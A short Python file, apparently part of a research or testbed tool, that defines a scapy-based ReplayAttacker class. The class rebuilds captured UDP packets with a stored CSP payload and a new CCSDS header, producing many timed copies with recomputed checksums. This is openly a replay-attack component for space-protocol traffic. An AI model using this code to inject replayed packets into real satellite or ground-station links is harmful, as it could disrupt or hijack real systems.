from scapy.all import Raw, UDP, IP

class ReplayAttacker:
    def __init__(self):
        self.buffer_payload = None

    def save_payload(self, csp_and_data_bytes):
        self.buffer_payload = csp_and_data_bytes

    def generate_replay(self, original_pkt, base_time, ccsds_header, multiplier):
        if self.buffer_payload is None:
            return []
            
        attack_packets = []
        new_payload = ccsds_header + self.buffer_payload

        for i in range(multiplier):
            attack_pkt = original_pkt.copy()
            attack_pkt.time = base_time + (i * 0.001)
            attack_pkt[UDP].payload = Raw(load=new_payload)
            
            del attack_pkt[UDP].len
            del attack_pkt[UDP].chksum
            if attack_pkt.haslayer(IP):
                del attack_pkt[IP].len
                del attack_pkt[IP].chksum
                
            attack_packets.append(attack_pkt)
            
        return attack_packets
